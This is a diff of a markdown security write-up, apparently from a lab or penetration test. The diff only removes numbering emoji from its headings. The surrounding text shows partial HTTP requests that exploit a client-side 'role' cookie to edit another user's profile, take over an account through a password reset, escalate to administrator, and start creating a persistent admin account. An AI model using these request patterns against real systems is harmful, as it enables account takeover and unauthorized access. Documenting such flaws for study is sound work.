@@ -115,7 +115,7 @@ Cookie: role=employee
 The critical observation was that **authorization control was dependent on a client-side cookie (`role=employee`)**, indicating a **severe security flaw**.
 
 ### **Privilege Escalation via API Manipulation**
-#### **1️⃣ Unauthorized User Modification**
+#### ** Unauthorized User Modification**
 I modified a request to **edit another user’s profile**:
 ```http
 PUT /profile/api.php/profile/2
@@ -131,7 +131,7 @@ Cookie: role=employee
 ```
  **Impact:** Enabled password reset takeover of the target account.
 
-#### **2️⃣ Escalating Privileges to Administrator**
+#### ** Escalating Privileges to Administrator**
 ```http
 PUT /profile/api.php/profile/1
 Content-Type: application/json
@@ -144,7 +144,7 @@ Cookie: role=employee
 ```
  **Effect:** Elevated my privileges to **administrator**.
 
-#### **3️⃣ Creating a Persistent Admin Account**
+#### **Creating a Persistent Admin Account**
 ```http
 POST /profile/api.php/profile
 Content-Type: application/json
